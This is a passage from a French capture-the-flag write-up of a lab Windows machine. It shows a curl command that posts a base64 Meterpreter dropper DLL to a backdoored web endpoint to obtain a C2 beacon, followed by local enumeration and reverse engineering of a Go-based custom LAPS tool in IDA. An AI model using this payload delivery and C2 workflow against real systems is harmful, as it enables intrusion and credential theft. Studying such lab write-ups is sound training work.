+</span></span><span class="line"><span class="cl">        <span class="n">Decommit</span> <span class="p">=</span> <span class="m">0x4000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Release</span> <span class="p">=</span> <span class="m">0x8000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Reset</span> <span class="p">=</span> <span class="m">0x80000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Physical</span> <span class="p">=</span> <span class="m">0x400000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">TopDown</span> <span class="p">=</span> <span class="m">0x100000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">WriteWatch</span> <span class="p">=</span> <span class="m">0x200000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">LargePages</span> <span class="p">=</span> <span class="m">0x20000000</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="na">
+</span></span></span><span class="line"><span class="cl"><span class="na">    [Flags]</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">enum</span> <span class="n">MemoryProtection</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Execute</span> <span class="p">=</span> <span class="m">0x10</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ExecuteRead</span> <span class="p">=</span> <span class="m">0x20</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ExecuteReadWrite</span> <span class="p">=</span> <span class="m">0x40</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ExecuteWriteCopy</span> <span class="p">=</span> <span class="m">0x80</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">NoAccess</span> <span class="p">=</span> <span class="m">0x01</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ReadOnly</span> <span class="p">=</span> <span class="m">0x02</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ReadWrite</span> <span class="p">=</span> <span class="m">0x04</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">WriteCopy</span> <span class="p">=</span> <span class="m">0x08</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">GuardModifierflag</span> <span class="p">=</span> <span class="m">0x100</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">NoCacheModifierflag</span> <span class="p">=</span> <span class="m">0x200</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">WriteCombineModifierflag</span> <span class="p">=</span> <span class="m">0x400</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Je ne vais pas rentrer dans les détails étant donné que c&rsquo;est une boilerplate de shellcode très classique. Néanmoins il est important de noter qu&rsquo;étant donné que le processus qui va charger notre assembly est un processus <code>x86</code>, il faut donc générer un shellcode <code>x86</code> et pas <code>x64</code> et idem pour la compilation dans Visual Studio, bien mettre l&rsquo;option <code>Any CPU</code> pour la cible. Je pense que cela peut poser problème dans des cas d&rsquo;accès au <code>PEB</code> par exemple (de manière générale pour les injections de code dans des processus, bien respecter l&rsquo;architecture du processus hôte). Une fois cela pris en compte on peut tester l&rsquo;envoi de notre payload comme ceci:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">curl  -k &#34;https://10.10.11.240:443/ews/MsExgHealthCheckd/&#34; --data-urlencode &#34;sdafwe3rwe23=$(base64 DropperMeterpreter.dll)&#34;
+</span></span></code></pre></div><p>Et on obtient bien une session sur le <code>TeamServer</code>:</p>
+<div>
+    <img src="assets/session_ruben.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>Cette sessions tourne sous l&rsquo;utilisateur <code>ruben</code> à un niveau d&rsquo;intégrité standard:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">USER INFORMATION
+</span></span><span class="line"><span class="cl">----------------
+</span></span><span class="line"><span class="cl">User Name    SID                                           
+</span></span><span class="line"><span class="cl">============ ==============================================
+</span></span><span class="line"><span class="cl">napper\ruben S-1-5-21-1567175541-2888103920-4161894620-1001
+</span></span><span class="line"><span class="cl">GROUP INFORMATION
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">Group Name                           Type             SID          Attributes                                        
+</span></span><span class="line"><span class="cl">==================================== ================ ============ ==================================================
+</span></span><span class="line"><span class="cl">Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY\BATCH                   Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
+</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
+</span></span><span class="line"><span class="cl">----------------------
+</span></span><span class="line"><span class="cl">Privilege Name                            Description                                                        State   
+</span></span><span class="line"><span class="cl">========================================= ================================================================== ========
+</span></span><span class="line"><span class="cl">SeShutdownPrivilege                       Shut down the system                                               Disabled
+</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
+</span></span><span class="line"><span class="cl">SeUndockPrivilege                         Remove computer from docking station                               Disabled
+</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
+</span></span><span class="line"><span class="cl">SeTimeZonePrivilege                       Change the time zone                                               Disabled
+</span></span><span class="line"><span class="cl">SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
+</span></span></code></pre></div><p>Après avoir récupéré le flag user à <code>C:\Users\ruben\Desktop\user.txt</code>, on commence à chercher aux endroits habituels pour pour trouver un moyen de privesc:</p>
+<ul>
+<li><code>C:\inetpub</code> (là où est stocké le code et les données d&rsquo;un serveur IIS)</li>
+<li><code>C:\Users\ruben</code> (Le dossier utilisateur)</li>
+<li><code>C:\Program Files\</code> (Le dossier d&rsquo;installation des programmes par défault)</li>
+</ul>
+<p>On peut aussi lister les utilisateurs locaux:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[02/04 10:47:52] beacon&gt; shell net user
+</span></span><span class="line"><span class="cl">[02/04 10:47:52] [*] Tasked beacon to run: net user
+</span></span><span class="line"><span class="cl">[02/04 10:47:52] [+] host called home, sent: 39 bytes
+</span></span><span class="line"><span class="cl">[02/04 10:47:52] [+] received output:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User accounts for \\NAPPER
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">Administrator            backup                   DefaultAccount           
+</span></span><span class="line"><span class="cl">example                  Guest                    ruben                    
+</span></span><span class="line"><span class="cl">WDAGUtilityAccount       
+</span></span><span class="line"><span class="cl">The command completed successfully.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[02/04 10:46:28] beacon&gt; shell net user backup
+</span></span><span class="line"><span class="cl">[02/04 10:46:28] [*] Tasked beacon to run: net user backup
+</span></span><span class="line"><span class="cl">[02/04 10:46:28] [+] host called home, sent: 46 bytes
+</span></span><span class="line"><span class="cl">[02/04 10:46:28] [+] received output:
+</span></span><span class="line"><span class="cl">User name                    backup
+</span></span><span class="line"><span class="cl">Full Name                    backup
+</span></span><span class="line"><span class="cl">Comment                      
+</span></span><span class="line"><span class="cl">User&#39;s comment               
+</span></span><span class="line"><span class="cl">Country/region code          000 (System Default)
+</span></span><span class="line"><span class="cl">Account active               Yes
+</span></span><span class="line"><span class="cl">Account expires              Never
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Password last set            2/4/2024 7:42:36 AM
+</span></span><span class="line"><span class="cl">Password expires             Never
+</span></span><span class="line"><span class="cl">Password changeable          2/4/2024 7:42:36 AM
+</span></span><span class="line"><span class="cl">Password required            Yes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User may change password     Yes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Workstations allowed         All
+</span></span><span class="line"><span class="cl">Logon script                 
+</span></span><span class="line"><span class="cl">User profile                 
+</span></span><span class="line"><span class="cl">Home directory               
+</span></span><span class="line"><span class="cl">Last logon                   2/3/2024 3:08:58 PM
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Logon hours allowed          All
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Local Group Memberships      *Administrators       
+</span></span><span class="line"><span class="cl">Global Group memberships     *None                 
+</span></span><span class="line"><span class="cl">The command completed successfully.
+</span></span></code></pre></div><p>L&rsquo;utilisateur <code>backup</code> fait partie des administrateurs locaux, c&rsquo;est de ce compte que l&rsquo;on devra prendre le contrôle.
+On peut aussi essayer de lister les ports ouverts en interne pour trouver des services internes:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Proto  Local Address          Foreign Address        State           PID
+</span></span><span class="line"><span class="cl">TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
+</span></span><span class="line"><span class="cl">TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       896
+</span></span><span class="line"><span class="cl">TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4
+</span></span><span class="line"><span class="cl">TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+</span></span><span class="line"><span class="cl">TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       2896
+</span></span><span class="line"><span class="cl">TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       672
+</span></span><span class="line"><span class="cl">TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       516
+</span></span><span class="line"><span class="cl">TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1080
+</span></span><span class="line"><span class="cl">TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1464
+</span></span><span class="line"><span class="cl">TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       652
+</span></span><span class="line"><span class="cl">TCP    10.10.11.240:139       0.0.0.0:0              LISTENING       4
+</span></span><span class="line"><span class="cl">TCP    127.0.0.1:9200         0.0.0.0:0              LISTENING       4852
+</span></span><span class="line"><span class="cl">TCP    127.0.0.1:9300         0.0.0.0:0              LISTENING       4852
+</span></span><span class="line"><span class="cl">TCP    [::]:80                [::]:0                 LISTENING       4
+</span></span><span class="line"><span class="cl">TCP    [::]:135               [::]:0                 LISTENING       896
+</span></span><span class="line"><span class="cl">TCP    [::]:443               [::]:0                 LISTENING       4
+</span></span><span class="line"><span class="cl">TCP    [::]:445               [::]:0                 LISTENING       4
+</span></span><span class="line"><span class="cl">TCP    [::]:49664             [::]:0                 LISTENING       672
+</span></span><span class="line"><span class="cl">TCP    [::]:49665             [::]:0                 LISTENING       516
+</span></span><span class="line"><span class="cl">TCP    [::]:49666             [::]:0                 LISTENING       1080
+</span></span><span class="line"><span class="cl">TCP    [::]:49667             [::]:0                 LISTENING       1464
+</span></span><span class="line"><span class="cl">TCP    [::]:49668             [::]:0                 LISTENING       652
+</span></span><span class="line"><span class="cl">UDP    0.0.0.0:123            *:*                                    6032
+</span></span><span class="line"><span class="cl">UDP    0.0.0.0:5050           *:*                                    2896
+</span></span><span class="line"><span class="cl">UDP    0.0.0.0:5353           *:*                                    1880
+</span></span><span class="line"><span class="cl">UDP    0.0.0.0:5355           *:*                                    1880
+</span></span><span class="line"><span class="cl">UDP    10.10.11.240:137       *:*                                    4
+</span></span><span class="line"><span class="cl">UDP    10.10.11.240:138       *:*                                    4
+</span></span><span class="line"><span class="cl">UDP    10.10.11.240:1900      *:*                                    4668
+</span></span><span class="line"><span class="cl">UDP    10.10.11.240:62071     *:*                                    4668
+</span></span><span class="line"><span class="cl">UDP    127.0.0.1:1900         *:*                                    4668
+</span></span><span class="line"><span class="cl">UDP    127.0.0.1:49664        *:*                                    2752
+</span></span><span class="line"><span class="cl">UDP    127.0.0.1:62072        *:*                                    4668
+</span></span><span class="line"><span class="cl">UDP    [::]:123               *:*                                    6032
+</span></span><span class="line"><span class="cl">UDP    [::]:5353              *:*                                    1880
+</span></span><span class="line"><span class="cl">UDP    [::]:5355              *:*                                    1880
+</span></span><span class="line"><span class="cl">UDP    [::1]:1900             *:*                                    4668
+</span></span><span class="line"><span class="cl">UDP    [::1]:62070            *:*                                    4668
+</span></span><span class="line"><span class="cl">UDP    [fe80::b5d1:843e:603a:e055%10]:1900  *:*                                    4668
+</span></span><span class="line"><span class="cl">UDP    [fe80::b5d1:843e:603a:e055%10]:62069  *:*                                    4668
+</span></span></code></pre></div><p>Les ports 9200 et 9300 sont associés au service <code>Elasticsearch</code>. C&rsquo;est dans le dossier temporaire <code>C:\Temp</code> qu&rsquo;on trouve le code du blog:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[01/07 10:38:05] beacon&gt; ls
+</span></span><span class="line"><span class="cl">[01/07 10:38:05] [*] Tasked beacon to list files in .
+</span></span><span class="line"><span class="cl">[01/07 10:38:05] [+] host called home, sent: 19 bytes
+</span></span><span class="line"><span class="cl">[01/07 10:38:05] [*] Listing: c:\Temp\www\internal\
+</span></span><span class="line"><span class="cl"> Size     Type    Last Modified         Name
+</span></span><span class="line"><span class="cl"> ----     ----    -------------         ----
+</span></span><span class="line"><span class="cl">          dir     06/09/2023 00:18:40   archetypes
+</span></span><span class="line"><span class="cl">          dir     06/08/2023 11:14:20   assets
+</span></span><span class="line"><span class="cl">          dir     06/09/2023 00:18:40   content
+</span></span><span class="line"><span class="cl">          dir     06/08/2023 11:14:20   data
+</span></span><span class="line"><span class="cl">          dir     06/08/2023 11:14:20   layouts
+</span></span><span class="line"><span class="cl">          dir     06/09/2023 00:18:41   public
+</span></span><span class="line"><span class="cl">          dir     06/09/2023 00:18:40   resources
+</span></span><span class="line"><span class="cl">          dir     06/08/2023 11:14:20   static
+</span></span><span class="line"><span class="cl">          dir     06/09/2023 00:18:41   themes
+</span></span><span class="line"><span class="cl"> 0b       fil     06/09/2023 00:18:40   .hugo_build.lock
+</span></span><span class="line"><span class="cl"> 1003b    fil     06/09/2023 00:18:40   hugo.toml
+</span></span></code></pre></div><p>Dans le dossier <code>content</code> qui contient le contenu des articles en MarkDown on remarque un article qui n&rsquo;est pas encore publié sur le blog</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">---
+</span></span><span class="line"><span class="cl">title: &#34;**INTERNAL** Getting rid of LAPS&#34;
+</span></span><span class="line"><span class="cl">description: Replacing LAPS with out own custom solution
+</span></span><span class="line"><span class="cl">date: 2023-07-01
+</span></span><span class="line"><span class="cl">draft: true 
+</span></span><span class="line"><span class="cl">tags: [internal, sysadmin] 
+</span></span><span class="line"><span class="cl">---
+</span></span><span class="line"><span class="cl"># Intro
+</span></span><span class="line"><span class="cl">We are getting rid of LAPS in favor of our own custom solution. 
+</span></span><span class="line"><span class="cl">The password for the `backup` user will be stored in the local Elastic DB.
+</span></span><span class="line"><span class="cl">IT will deploy the decryption client to the admin desktops once it it ready. 
+</span></span><span class="line"><span class="cl">We do expect the development to be ready soon. The Malware RE team will be the first test group.
+</span></span></code></pre></div><p>Il explique que le serveur Elasticsearch est entre autre utilisé pour garder le mot de passe de l&rsquo;utilisateur <code>backup</code> et que la machine implémente une solution custom pour le générer à la place de <a href="https://www.it-connect.fr/chapitres/quest-ce-que-microsoft-laps/">LAPS</a>. Dans le dossier <code>internal-laps-alpha</code> On trouve la version alpha du système LAPS custom:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[01/07 11:08:24] beacon&gt; cd internal-laps-alpha
+</span></span><span class="line"><span class="cl">[01/07 11:08:24] [*] cd internal-laps-alpha
+</span></span><span class="line"><span class="cl">[01/07 11:08:24] [+] host called home, sent: 27 bytes
+</span></span><span class="line"><span class="cl">[01/07 11:08:26] beacon&gt; ls
+</span></span><span class="line"><span class="cl">[01/07 11:08:26] [*] Tasked beacon to list files in .
+</span></span><span class="line"><span class="cl">[01/07 11:08:26] [+] host called home, sent: 19 bytes
+</span></span><span class="line"><span class="cl">[01/07 11:08:26] [*] Listing: c:\Temp\www\internal\content\posts\internal-laps-alpha\
+</span></span><span class="line"><span class="cl"> Size     Type    Last Modified         Name
+</span></span><span class="line"><span class="cl"> ----     ----    -------------         ----
+</span></span><span class="line"><span class="cl"> 82b      fil     06/09/2023 00:28:35   .env
+</span></span><span class="line"><span class="cl"> 12mb     fil     06/09/2023 00:20:07   a.exe
+</span></span></code></pre></div><p>On télécharge les deux fichiers pour pouvoir en faire une analyse plus approfondie.</p>
+<h1 id="rétro-ingéniérie">Rétro-ingéniérie</h1>
+<p>Le premier fichier contient un ensemble de variables d&rsquo;environnement et le second est un exécutable Windows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">cat .env
+</span></span><span class="line"><span class="cl">ELASTICUSER=user
+</span></span><span class="line"><span class="cl">ELASTICPASS=DumpPassword\$Here
+</span></span><span class="line"><span class="cl">ELASTICURI=https://127.0.0.1:9200
+</span></span><span class="line"><span class="cl">file a.exe
+</span></span><span class="line"><span class="cl">a.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows, 13 sections
+</span></span></code></pre></div><p>On charge le binaire dans IDA et on découvre que le binaire a été codé en Go ce qui va nous compliquer un peu la tâche. Heureusement le binaire n&rsquo;est pas complètement strippé ce qui fait qu&rsquo;entre autre les noms des <code>RTTI</code> seront toujours présents ce qui ne sera pas du luxe pour faire le retypage. En effet on peut voir dans les types locaux que beaucoup de structures on été ajoutés:</p>
+<div>
+    <img src="assets/local_types.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>On commence par jeter un oeil aux fonctions et à leurs noms, étant donné que le binaire est codé en Go, il est statiquement linké ce qui implique que tous les symboles nécessaires comme ceux associés au runtime vont être présents et cela vaut aussi pour les libs externes comme par exemples <code>github_com_joho_godotenv_</code> qui est donc un package importé. On peut trouver le code de la fonction <code>main_main</code> qui est la fonction main du package main, là où le programme en tant que tel commence. Voilà un aperçu de la décompilation dans IDA Pro:</p>
+<div>
+    <img src="assets/main_dec.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>Et même si IDA 8.3 arrive à retrouver les strings Go (pas de null byte, comme en Rust) ainsi que quelques structures (<code>http_Transport</code>)c&rsquo;est peu lisible surtout sur la fin , on est bien sur du Go 😖. Je ne vais pas rentrer dans tous les détails mais voilà des points importants à prendre en compte:</p>
+<ul>
+<li>Même si IDA prend en compte la convention d&rsquo;appel de Golang: Les arguments sont passées dans <code>RAX, RBX, RCX, RDI, RSI, R8, R9, R10, R11</code> et les variables de retour retournées par valeurs sont passées dans <code>RAX</code> et <code>RBX</code>. Ce qui fait que si une fonction retourne une paire de valeur avec une option d&rsquo;erreur comme par exemple:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl">	<span class="nx">b</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">json</span><span class="p">.</span><span class="nf">Marshal</span><span class="p">(</span><span class="kd">var</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;error:&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">os</span><span class="p">.</span><span class="nx">Stdout</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span>
+</span></span></code></pre></div><p><code>err</code> sera retournée à partir de <code>RBX</code> mais si la fonction n&rsquo;est pas bien prototypée pour retourner une valeur contenue dans deux registres, le décompilateur ne va pas considérer <code>RBX</code> comme un valeur de retour si bien qu&rsquo;une des clause du <code>if</code> ne sera pas affichée comme sur l&rsquo;exemple ci-dessous où je n&rsquo;ai appliqué aucune modification:</p>
+<div>
+    <img src="assets/decomp_1.png", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>Le décompilateur affiche seulement le basic block d&rsquo;erreur qui appelle <code>Log.Fatal</code>.</p>
+<ul>
+<li>
+<p>Bien penser à utilser l&rsquo;option <code>set call type</code> en plus de retyper les pointeurs de fonctions.</p>
+</li>
+<li>
+<p>Etant donné que les librairies sont linkés directement dans le binaire, il faudra souvent se référrer au code source pour voir les prototypes des fonctions, par défault IDA a du mal à trouver le bon nombre d&rsquo;arguments passé à une fonction par exemple:</p>
+</li>
+</ul>
+<div>
+    <img src="./assets/args_num.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>On se réferre au code source du package <code>elasticsearch</code> de Go sur github:</p>
+<div>
+    <img src="./assets/newclient.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>Et on retype la fonction:</p>
+<div>
+    <img src="./assets/newclient_clean.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<ul>
+<li>Tout comme le Rust, le Go va visisblement faire usage des registres mis à disposition par le <code>SSE</code> et notamment pour mettre à zéro 16 bytes mémoire d&rsquo;un coup, pour les strings par exemple:</li>
+</ul>
+<div>
+    <img src="./assets/simd.png", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<ul>
+<li>
+<p>Les fonctions nommées <code>main_funcN</code> sont des fonctions anonymes parfois utilisées par le runtime, dans notre cas il ne sera pas utile de les reverse.</p>
+</li>
+<li>
+<p>L&rsquo;usage des types génériques se fait en passant paramètre <code>RTYPE</code> associé à un pointeur. Par exemple pour le type <code>any</code> qui est un aliais pour une interface vide <code>interface{}</code> et notamment utilisé dans le binaire par la fonction <code>json.Unmarshal</code> qui prend en argument une slice de bytes et un pointeur de type <code>any</code> vers un objet où déserialiser le JSON. Voilà comment l&rsquo;appel à <code>json.Unmarshal</code> pourrait être décompilé:</p>
+</li>
+</ul>
+<div>
+    <img src="./assets/generic.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>On voit bien que la structure passée en second paramètre a deux champs avec le premier qui indique le type pointé par le second. Pour obtenir ce résultat j&rsquo;ai créé le type local suivant:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">any_main_Seed</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">int</span><span class="o">*</span> <span class="n">rtype</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_ptr_main_Seed</span> <span class="n">main_seed_ptr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></div><h2 id="analyse-de-la-fonction-mainmain">Analyse de la fonction main.main</h2>
+<p>Une fois tous les ajustements fait, le code parait un peu plus lisible même si évidemment il y&rsquo;a beaucoup d&rsquo;appels qui servent au runtime pour le garbage collector notamment:</p>
+<div>
+    <img src="./assets/gc.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>On remarque quand même que le programme va utiliser la fonction <code>os.Getenv</code> pour récupérer les variables d&rsquo;environnement contenues dans le premier fichier. Ensuite le programme crée un objet <code>config</code> qu&rsquo;il utilise pour contacter le serveur elasticsearch sur l&rsquo;endpoint<code>_seed/1</code> via une requête <code>GET</code> et vérifie si la requête retourne une erreur:</p>
+<div>
+    <img src="./assets/first_request.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>Ensuite il extrait de la réponse JSON un objet de la structure <code>main.Seed</code> dont il va dériver une clé qu&rsquo;il passera à la fonction <code>genKey</code>:</p>
+<div>
+    <img src="./assets/use_seed.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>On va avant ça jeter un oeil aux autres fonctions du module main.</p>
+<h2 id="analyse-de-la-fonction-mainrandstringlist">Analyse de la fonction main.randStringList</h2>
+<p>Cette fonction se passe de commentaire, elle va juste piocher au hasard 40 lettres dans l&rsquo;alphabet minuscule et majuscule et les retouner dans une string. Ici le principal obstacle à la décompilation est l&rsquo;usage d&rsquo;une stack string avec des caractères unicode, c&rsquo;est pourquoi IDA ne nous sort pas une belle chaine de caractères même si c&rsquo;est un simple alphabet <code>a-zA-Z</code>:</p>
+<div>
+    <img src="./assets/alphabt.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<h2 id="analyse-de-la-fonction-maingenkey">Analyse de la fonction main.genKey</h2>
+<p>Cette fonction aussi est très simple, elle utilise la graine retournée par le serveur pour générer une slice de 16 nombres aléatoires.</p>
+<div>
+    <img src="./assets/genkey.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>Je ne vais pas trop rentrer dans les détails de la fonction <code>main.encrypt</code> car elle va simplement chiffrer la chaine de 40 caractères aléatoires avec la clé dérivée de la graine envoyée par le serveur en utilisant un iv lui aussi dérivé de la graine en utilisantl le package <code>crypto.rand</code>. Le chiffrement se fait avec de l&rsquo;AES CFB de manière très similaire à ce <a href="https://pkg.go.dev/crypto/cipher#example-NewCFBEncrypter">code là</a> disponible dans la documentation du module crypto. La chaine chiffrée est ensuite encodée en base 64.</p>
+<h2 id="suite-de-la-fonction-mainmain">Suite de la fonction main.main</h2>
+<p>On remarque ensuite que la fonction main essaye de créer un nouvel indice dans la base de données elasticsearch nommé <code>user-00001</code>:</p>
+<div>
+    <img src="./assets/create_indice.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>Ensuite le programme va récupérer la chaine encodée en base64, l&rsquo;associer au timestamp actuel et stocker le résultat dans un objet JSON sous la forme d&rsquo;une tranche de bytes:</p>
+<div>
+    <img src="./assets/timestamp.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>Et c&rsquo;est ces données JSON qui sont ensuite envoyés avec une requète POST vers l&rsquo;endpoint <code>user-00001</code> récemment créé.</p>
+<div>
+    <img src="./assets/post.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>Et c&rsquo;est là que le programme devient intéressant:</p>
+<div>
+    <img src="./assets/exec.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>Ce code va mettre à jour le mot de passe de l&rsquo;utilisateur backup avec la commande <code>net user backup &lt;nouveau_mdp&gt;</code> et on remarque que le mot de passe mis à jour consiste en les 40 caractères aléatoires générés dans la fonction <code>randStringList</code>.</p>
+<h2 id="résumé-de-la-rétro-ingéniérie">Résumé de la rétro-ingéniérie</h2>
+<p>Pour synthétiser, a.exe est la version alpha d&rsquo;un système de LAPS qui va mettre régulièrement à jour le mot de passe de l&rsquo;utilisateur backup. Pour ce faire il va récupérer une graine sur le serveur elasticsearch, générer un mot de passe de 40 caractères et envoyer sur l&rsquo;indice user-00001 la version chiffrée de ce mot de passe.</p>
+<p>Après avoir compris le principe du programme on va essayer d&rsquo;intercepter les requêtes entre le binaire et le serveur elasticsearch pour ensuite les instrumenter et retrouver la graine et le mot de passe chiffré. 😈</p>
+<h1 id="interception-des-requètes-du-système-laps">Interception des requètes du système LAPS</h1>
+<p>Pour voir plus en détail les requetes envoyées par le binaire <code>a.exe</code>, j&rsquo;ai choisi d&rsquo;exploiter le fait que le fichier contenant les variables d&rsquo;environnment pour accéder et s&rsquo;authentifier auprès du serveur Elasticsearch soit modifiable par l&rsquo;utilisateur ruben: Je vais mettre en place un <code>Invisible Proxying</code> avec burpsuite pour intercepter les requetes:</p>
+<ol>
+<li>On commence par modifier le fichier <code>.env</code> comme ceci:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">ELASTICUSER=user
+</span></span><span class="line"><span class="cl">ELASTICPASS=DumpPassword\$Here
+</span></span><span class="line"><span class="cl">
